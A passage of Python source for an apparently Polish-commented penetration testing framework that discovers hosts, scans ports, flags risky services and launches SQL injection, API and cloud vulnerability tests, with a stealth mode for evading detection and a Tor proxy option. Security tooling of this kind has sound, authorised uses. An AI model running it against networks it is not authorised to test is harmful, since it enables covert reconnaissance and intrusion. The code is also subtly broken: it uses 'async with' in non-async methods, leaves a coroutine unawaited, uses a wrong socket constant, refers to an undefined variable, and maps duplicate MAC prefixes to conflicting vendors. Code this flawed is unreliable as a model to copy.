                    if platform.system() == 'Linux':
                        arp_args = ['--localnet']
                        if self.stealth_mode:
                            arp_args.extend(['-r', '1', '-t', '100'])
                        
                        result = subprocess.run(['arp-scan'] + arp_args,
                                             capture_output=True, text=True, timeout=60)
                        
                        for line in result.stdout.split('\n'):
                            if '\t' in line and '(' in line:
                                parts = line.split('\t')
                                if len(parts) >= 3:
                                    ip = parts[0].strip()
                                    mac = parts[1].strip()
                                    vendor = parts[2].strip().strip('()')
                                    devices.append({
                                        'ip': ip,
                                        'mac': mac,
                                        'vendor': vendor,
                                        'status': 'Up'
                                    })
                except:
                    self.logger.error("Nie można użyć nmap lub arp-scan. Używanie podstawowego skanowania.")
                    # Proste skanowanie pingiem
                    self._ping_scan(network_range, devices, self.stealth_mode)
        
        except Exception as e:
            self.logger.error(f"Błąd podczas skanowania sieci: {e}")
        
        return devices

    def get_network_interfaces(self) -> List[Dict]:
        """Pobiera informacje o interfejsach sieciowych"""
        interfaces = []
        try:
            for interface in netifaces.interfaces():
                if interface == 'lo':
                    continue
                
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    ipv4_info = addrs[netifaces.AF_INET][0]
                    interfaces.append({
                        'name': interface,
                        'ip': ipv4_info['addr'],
                        'netmask': ipv4_info.get('netmask', '255.255.255.0'),
                        'broadcast': ipv4_info.get('broadcast', 'N/A')
                    })
        except Exception as e:
            self.logger.error(f"Błąd podczas pobierania interfejsów sieciowych: {e}")
        
        return interfaces

    def get_network_range(self, interface_ip: str, netmask: str) -> str:
        """Oblicza zakres sieci na podstawie IP i maski"""
        try:
            network = ipaddress.IPv4Network(f"{interface_ip}/{netmask}", strict=False)
            return str(network)
        except:
            return "192.168.1.0/24"  # Domyślny zakres

    def _get_vendor_from_mac(self, mac: str) -> str:
        """Pobiera producenta na podstawie adresu MAC"""
        mac_prefix = mac.replace(':', '').upper()[:6]
        vendors = {
            '00:1A:2B': 'Cisco',
            '00:14:BF': 'Samsung',
            '00:22:FB': 'Apple',
            '00:1C:B3': 'Intel',
            '00:24:E8': 'TP-Link',
            '00:1A:79': 'Netgear',
            '00:0F:CC': 'D-Link',
            '00:1A:2B': 'Huawei',
            '00:21:CC': 'Xiaomi',
            '00:1A:4D': 'Samsung',
            '00:1A:79': 'Asus',
            'B8:27:EB': 'Raspberry Pi',
            'DC:A6:32': 'Android',
            '70:85:C2': 'Nintendo',
            'E0:CB:4E': 'PlayStation'
        }
        
        for prefix, vendor in vendors.items():
            if mac_prefix.startswith(prefix.replace(':', '').upper()):
                return vendor
        
        return 'Unknown'

    def _ping_scan(self, network_range: str, devices: List[Dict], stealth: bool):
        """Proste skanowanie pingiem (jako fallback)"""
        try:
            network = ipaddress.IPv4Network(network_range)
            timeout = 3 if not stealth else 1
            count = 1 if not stealth else 1
            
            for ip in network.hosts():
                ip_str = str(ip)
                try:
                    response = subprocess.run(['ping', '-c', str(count), '-W', str(timeout), ip_str],
                                          capture_output=True, timeout=timeout+1)
                    if response.returncode == 0:
                        devices.append({'ip': ip_str, 'status': 'Up'})
                except:
                    continue
        except:
            pass

    def scan_ports_on_device(self, device_ip: str, ports: List[int] = None) -> Dict:
        """Skanuje porty na konkretnym urządzeniu"""
        if ports is None:
            # Popularne porty do skanowania
            ports = list(range(1, 1025))  # Porty systemowe
            # Dodatkowe porty
            additional_ports = [135, 139, 143, 3306, 3389, 5900, 8080, 8443, 9000, 9090]
            ports.extend(additional_ports)
            ports = list(set(ports))  # Usuń duplikaty
            ports.sort()
        
        open_ports = []
        vulnerable_ports = []
        service_info = {}
        scan_results = {}
        
        if not self.stealth_mode:
            self.logger.info(f"Skanowanie portów na {device_ip}...")
        
        # Użyj nmap do skanowania portów
        try:
            nmap_args = ['-p', ','.join(map(str, ports[:100])), device_ip]
            if self.stealth_mode:
                nmap_args.extend(['-T2', '--max-retries', '1', '--host-timeout', '5s'])
            
            result = subprocess.run(['nmap'] + nmap_args,
                                 capture_output=True, text=True, timeout=30)
            
            # Parsuj wyniki nmap
            current_port = None
            for line in result.stdout.split('\n'):
                if 'Nmap scan report for' in line:
                    continue
                elif '/tcp' in line or '/udp' in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        port_info = parts[0].split('/')
                        port = int(port_info[0])
                        protocol = port_info[1]
                        state = parts[1]
                        service = parts[2]
                        
                        if state == 'open':
                            open_ports.append(port)
                            service_info[port] = {
                                'service': service,
                                'protocol': protocol,
                                'state': state
                            }
                            
                            # Sprawdź, czy port jest podatny
                            if self._check_port_vulnerability(port):
                                vulnerable_ports.append(port)
                
                elif 'Service detection performed' in line:
                    break
            
            scan_results = {
                'open_ports': open_ports,
                'vulnerable_ports': vulnerable_ports,
                'service_info': service_info,
                'total_ports_scanned': len(ports)
            }
            
        except:
            # Fallback: proste skanowanie TCP
            scan_results = self._tcp_scan(device_ip, ports, self.stealth_mode)
        
        return scan_results

    def _tcp_scan(self, device_ip: str, ports: List[int], stealth: bool) -> Dict:
        """Proste skanowanie TCP (jako fallback)"""
        open_ports = []
        vulnerable_ports = []
        service_info = {}
        
        timeout = 2 if not stealth else 0.5
        delay = 0.1 if not stealth else 0.05
        
        for port in ports:
            sock = socket.socket(socket.socket.AF_INET, socket.socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            try:
                start_time = time.time()
                result = sock.connect_ex((device_ip, port))
                
                if result == 0:
                    open_ports.append(port)
                    
                    # Prosta identyfikacja usługi
                    service = self._identify_service(port)
                    service_info[port] = {
                        'service': service,
                        'protocol': 'tcp',
                        'state': 'open'
                    }
                    
                    # Sprawdź, czy port jest podatny
                    if self._check_port_vulnerability(port):
                        vulnerable_ports.append(port)
                
                # Opóźnienie w trybie stealth
                if stealth and (time.time() - start_time) < delay:
                    time.sleep(delay - (time.time() - start_time))
                    
            except:
                pass
            finally:
                sock.close()
        
        return {
            'open_ports': open_ports,
            'vulnerable_ports': vulnerable_ports,
            'service_info': service_info,
            'total_ports_scanned': len(ports)
        }

    def _identify_service(self, port: int) -> str:
        """Identyfikuje usługę na podstawie numeru portu"""
        services = {
            20: 'FTP (Data)',
            21: 'FTP (Control)',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            135: 'RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            3389: 'RDP',
            5900: 'VNC',
            8080: 'HTTP Alternate',
            8443: 'HTTPS Alternate',
            3306: 'MySQL',
            9000: 'Web Server',
            9090: 'Web Server'
        }
        
        return services.get(port, f'Unknown ({port})')

    def _check_port_vulnerability(self, port: int) -> bool:
        """Sprawdza, czy dany port jest potencjalnie podatny"""
        vulnerable_ports = {
            21: 'FTP - Potencjalne luki w konfiguracji',
            22: 'SSH - Możliwe słabe hasła',
            23: 'Telnet - Niezaszyfrowane połączenia',
            25: 'SMTP - Potencjalne luki w konfiguracji',
            110: 'POP3 - Niezaszyfrowane połączenia',
            143: 'IMAP - Potencjalne luki w konfiguracji',
            3306: 'MySQL - Słabe zabezpieczenia',
            445: 'SMB - Wiele znanych luk (np. EternalBlue)',
            3389: 'RDP - Potencjalne ataki brute-force',
            5900: 'VNC - Słabe zabezpieczenia'
        }
        
        return port in vulnerable_ports

    def identify_web_services(self, device: Dict) -> List[str]:
        """Identyfikuje usługi webowe na urządzeniu"""
        web_services = []
        device_ip = device['ip']
        
        # Sprawdź porty HTTP/HTTPS
        ports_to_check = [80, 443, 8080, 8443, 9000, 9090]
        
        for port in ports_to_check:
            if port in device.get('open_ports', []):
                # Sprawdź, czy to faktycznie usługa webowa
                try:
                    url = f"http://{device_ip}:{port}" if port != 443 else f"https://{device_ip}:{port}"
                    async with self.session.get(url, timeout=5) as response:
                        if response.status == 200:
                            web_services.append(url)
                            self.logger.info(f"Znaleziono usługę webową: {url}")
                except:
                    continue
        
        return web_services

    def detect_api_type(self, url: str) -> Optional[str]:
        """Detect API type based on URL and response"""
        try:
            async with self.session.get(url, timeout=5) as response:
                content_type = response.headers.get('Content-Type', '')
                
                # Check for GraphQL
                if 'graphql' in url.lower() or 'application/graphql' in content_type.lower():
                    return 'graphql'
                
                # Check for REST API patterns
                if 'json' in content_type.lower() or 'api' in url.lower():
                    return 'rest_json'
                
                # Check for SOAP
                if 'soap' in url.lower() or 'text/xml' in content_type.lower():
                    return 'soap_xml'
                
        except:
            pass
        
        return None

    async def test_web_services(self, web_services: List[str]) -> List[VulnerabilityResult]:
        """Test web services for SQL injection, API and cloud vulnerabilities"""
        all_vulnerabilities = []
        
        for url in web_services:
            self.logger.info(f"Testowanie usług webowych: {url}")
            
            # Test SQL injection first
            parameters = {'id': '1', 'page': '1', 'search': 'test'}
            sql_vulnerabilities = await self.scan_url(url, parameters=parameters)
            all_vulnerabilities.extend(sql_vulnerabilities)
            
            # Test API vulnerabilities
            api_type = self.detect_api_type(url)
            if api_type:
                api_vulnerabilities = await self.test_api_endpoint(url, api_type)
                all_vulnerabilities.extend(api_vulnerabilities)
                self.api_results.extend(api_vulnerabilities)
            
            # Test cloud vulnerabilities
            cloud_provider = await self.detect_cloud_provider(url)
            if cloud_provider:
                cloud_vulnerabilities = await self.test_cloud_vulnerabilities(url, cloud_provider)
                all_vulnerabilities.extend(cloud_vulnerabilities)
                self.cloud_results.extend(cloud_vulnerabilities)
                device['cloud_indicators'] = [cloud_provider]
        
        return all_vulnerabilities

    async def run_comprehensive_scan(self, network_range: str = None) -> Dict:
        """Uruchamia pełne skanowanie sieci"""
        self.logger.info("Rozpoczynam kompleksowe skanowanie sieci...")
        
        await self.initialize_session(
            proxy_url=self.config.get('proxy_url'),
            use_tor=self.config.get('use_tor', False)
        )

        # 1. Skanowanie sieci w poszukiwaniu urządzeń
        network_devices = self.scan_network_devices(network_range)
        self.logger.info(f"Znaleziono {len(network_devices)} urządzeń")

        # 2. Skanowanie portów na każdym urządzeniu
        for device in network_devices:
            port_scan = self.scan_ports_on_device(device['ip'])
            device['open_ports'] = port_scan['open_ports']
            device['services'] = port_scan['service_info']
            device['vulnerabilities'] = []
            device['api_endpoints'] = []
            device['cloud_indicators'] = []
            
            # 3. Identyfikacja usług webowych
            web_services = self.identify_web_services(device)
            device['web_services'] = web_services
            
            # 4. Testowanie SQL injection, API i cloud vulnerabilities
            if web_services:
                vulnerabilities = await self.test_web_services(web_services)
                device['vulnerabilities'] = vulnerabilities
                self.sql_results.extend([v for v in vulnerabilities if v.api_type is None and v.cloud_provider is None])
                self.api_results.extend([v for v in vulnerabilities if v.api_type is not None and v.cloud_provider is None])
                self.cloud_results.extend([v for v in vulnerabilities if v.cloud_provider is not None])

        await self.session.close()
        
        self.network_devices = network_devices
        self.logger.info(f"Skanowanie zakończone. Znaleziono {len(self.sql_results) + len(self.api_results) + len(self.cloud_results)} podatności")

        return {
            'network_devices': network_devices,
            'sql_vulnerabilities': self.sql_results,
            'api_vulnerabilities': self.api_results,
            'cloud_vulnerabilities': self.cloud_results,
            'total_devices': len(network_devices),
            'total_vulnerabilities': len(self.sql_results) + len(self.api_results) + len(self.cloud_results)
        }

    def generate_comprehensive_report(self) -> str:
        """Generuje kompleksowy raport penetracyjny"""
        report_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        total_vulns = len(self.sql_results) + len(self.api_results) + len(self.cloud_results)
        critical_vulns = len([v for v in (self.sql_results + self.api_results + self.cloud_results) if v.severity == 'Critical'])
        high_vulns = len([v for v in (self.sql_results + self.api_results + self.cloud_results) if v.severity == 'High'])

        report = f"""
# Kompleksowy Raport Testów Penetracyjnych
# Sieć WiFi + SQL Injection + API + Cloud Analysis

**Data:** {report_date}
**Tryb:** {'Stealth' if self.stealth_mode else 'Normal'}
**Zakres sieci:** {self.config.get('network_range', 'Auto-detected')}
**Proxy:** {'Tor' if self.config.get('use_tor') else self.config.get('proxy_url', 'Brak')}

## Podsumowanie Wykrytych Urządzeń

Znaleziono **{len(self.network_devices)}** urządzeń w sieci.

### Szczegóły Urządzeń

"""

        for device in self.network_devices:
            report += f"""
#### Urządzenie: {device['ip']} ({device['vendor']})
- **Status:** {device['status']}
- **MAC:** {device.get('mac', 'N/A')}
- **Otwarte porty:** {device.get('open_ports', [])}
- **Usługi webowe:** {len(device.get('web_services', []))}
- **Wskaźniki chmurowe:** {device.get('cloud_indicators', [])}

"""

            if device.get('vulnerabilities'):
                report += "##### Wykryte podatności:\n"
                for vuln in device['vulnerabilities']:
                    report += f"- {vuln.vulnerability_type} (Krytyczność: {vuln.severity})\n"

        report += f"""

## Podsumowanie Ryzyka

- **Łączna liczba podatności:** {total_vulns}
- **Krytyczne:** {critical_vulns}
- **Wysokie:** {high_vulns}

## Szczegółowe Wyniki SQL Injection

"""

        for i, vuln in enumerate(self.sql_results, 1):
            report += f"""
### Wynik {i}: {vuln.vulnerability_type}

**URL:** `{vuln.url}`
**Parametr:** `{vuln.parameter}`
**Metoda:** `{vuln.method}`
**Krytyczność:** **{vuln.severity}**
**Pewność:** {vuln.confidence:.0%}

**Dowód:** {vuln.evidence}

**Proof of Concept:**
```
{vuln.proof_of_concept}
```

**Remediation:** {vuln.remediation}

---
"""

        report += f"""

## Szczegółowe Wyniki API Vulnerabilities

"""

        for i, vuln in enumerate(self.api_results, 1):
            report += f"""
### Wynik {i}: {vuln.vulnerability_type}

**URL:** `{vuln.url}`
**Typ API:** `{vuln.api_type}`
**Metoda:** `{vuln.method}`
**Krytyczność:** **{vuln.severity}**
**Pewność:** {vuln.confidence:.0%}

**Dowód:** {vuln.evidence}

**Proof of Concept:**
```
{vuln.proof_of_concept}
```

**Remediation:** {vuln.remediation}

---
"""

        report += f"""

## Szczegółowe Wyniki Cloud Vulnerabilities

"""

        for i, vuln in enumerate(self.cloud_results, 1):
            report += f"""
### Wynik {i}: {vuln.vulnerability_type}

**URL:** `{vuln.url}`
**Dostawca Chmury:** `{vuln.cloud_provider}`
**Metoda:** `{vuln.method}`
**Krytyczność:** **{vuln.severity}**
**Pewność:** {vuln.confidence:.0%}

**Dowód:** {vuln.evidence}

**Proof of Concept:**
```
{vuln.proof_of_concept}
```

**Remediation:** {vuln.remediation}

---
"""

        return report

    def generate_pdf_report(self, report_text: str, filename: str) -> None:
        """Generuje raport w formacie PDF"""
        if not PDF_EXPORT_AVAILABLE:
            self.logger.error("PDF export is not available. Please install reportlab.")
            return

        try:
            # Create a PDF document
            doc = SimpleDocTemplate(filename, pagesize=letter)
            styles = getSampleStyleSheet()
            
            # Create custom styles
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=18,
                spaceAfter=30
            )
            heading_style = ParagraphStyle(
                'CustomHeading',
                parent=styles['Heading2'],
                fontSize=14,
                spaceAfter=10
            )
            subheading_style = ParagraphStyle(
                'CustomSubheading',
                parent=styles['Heading3'],
                fontSize=12,
                spaceAfter=8
            )
            
            # Parse the text report and create PDF elements
            elements = []
            lines = report_text.split('\n')
            current_section = None
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                # Title
                if line.startswith("# "):
                    title = line[2:]
                    elements.append(Paragraph(title, title_style))
                    elements.append(Spacer(1, 12))
                
                # Section headers
                elif line.startswith("## "):
                    current_section = line[3:]
                    elements.append(Paragraph(current_section, heading_style))
                    elements.append(Spacer(1, 8))
                
                # Sub-section headers
                elif line.startswith("### "):
                    subheading = line[4:]
                    elements.append(Paragraph(subheading, subheading_style))
                
                # Code blocks
                elif line.startswith("```\n") and line.endswith("\n```"):
                    code = line[3:-3].strip()
                    elements.append(Preformatted(code, styles['Code']))
                    elements.append(Spacer(1, 6))
                
                # Regular text
                else:
                    # Handle bullet points
                    if line.startswith("- "):
                        line = "• " + line[2:]
                    elements.append(Paragraph(line, styles['BodyText']))
            
            # Build the PDF
            doc.build(elements)
            self.logger.info(f"PDF report generated: {filename}")
            
        except Exception as e:
            self.logger.error(f"Error generating PDF report: {e}")

# Professional CLI Interface
async def main():
    """Main function for professional use"""
    parser = argparse.ArgumentParser(description='Comprehensive Network Penetration Testing Framework')

    parser.add_argument('-r', '--range', help='Network range to scan (e.g., 192.168.1.0/24)')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (slower, less detectable)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests')
    parser.add_argument('--output', help='Output text report file')
    parser.add_argument('--pdf-output', help='Output PDF report file')
    parser.add_argument('--log-level', default='INFO', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'])
    parser.add_argument('--fast-mode', action='store_true', help='Fast mode')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://proxy:8080)')
    parser.add_argument('--tor', action='store_true', help='Use Tor proxy (requires Tor running on 127.0.0.1:9050)')
    
    args = parser.parse_args()

    config = {
        'network_range': args.range,
        'stealth': args.stealth,
        'delay': args.delay,
        'log_level': args.log_level,
        'fast_mode': args.fast_mode,
        'proxy_url': args.proxy,
        'use_tor': args.tor
    }

    # Validate network range or URL
    if args.range and not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$', args.range):
        print("Error: Invalid network range format. Use format like 192.168.1.0/24")
        return 1
    
    framework = ComprehensivePenTestFramework(config)
    
    # Wyświetl ostrzeżenie
    print("=" * 80)
    print("OSTRZEŻENIE: KOMPLEKSOWE NARZĘDZIE DO TESTÓW PENETRACYJNYCH")
    print("=" * 80)
    print("\n⚠️  UWAGA: To narzędzie powinno być używane wyłącznie do:")
    print("   • Testowania sieci, do których masz pełne uprawnienia")
    print("   • Oceny bezpieczeństwa własnych sieci")
    print("   • Celów edukacyjnych i szkoleniowych")
    print("\n❌ ZABRANIA SIĘ używania tego narzędzia do:")
    print("   • Nieautoryzowanego testowania sieci")
    print("   • Ataków na systemy, do których nie masz uprawnień")
    print("   • Działalności nielegalnej lub nieetycznej")
    print("\n📝 Pamiętaj: Nieautoryzowane testowanie penetracyjne jest nielegalne!")
    print("\n🔒 Jesteś Red Team f1cu i testujesz WYŁĄCZNIE na swoich sieciach WiFi")
    print("=" * 80)
    print("\nCzy kontynuować? (tak/nie): ", end="")
    
    response = input().lower()
    if response != 'tak':
        print("Anulowano. Narzędzie zostanie zamknięte.")
        return 0

    results = await framework.run_comprehensive_scan(args.range)

    report_text = framework.generate_comprehensive_report()

    if args.output:
        with open(args.output, 'w') as f:
            f.write(report_text)
        print(f"Raport tekstowy zapisany do {args.output}")
    
    if args.pdf_output:
        framework.generate_pdf_report(report_text, args.pdf_output)
    
    print(report_text)

    print(f"\n✅ Kompleksowe skanowanie zakończone pomyślnie.")
    print(f"Znaleziono {results['total_vulnerabilities']} podatności na {results['total_devices']} urządzeniach.")

    return 1 if results['total_vulnerabilities'] > 0 else 0

if __name__ == '__main__':
    import sys
    sys.exit(asyncio.run(main()))
```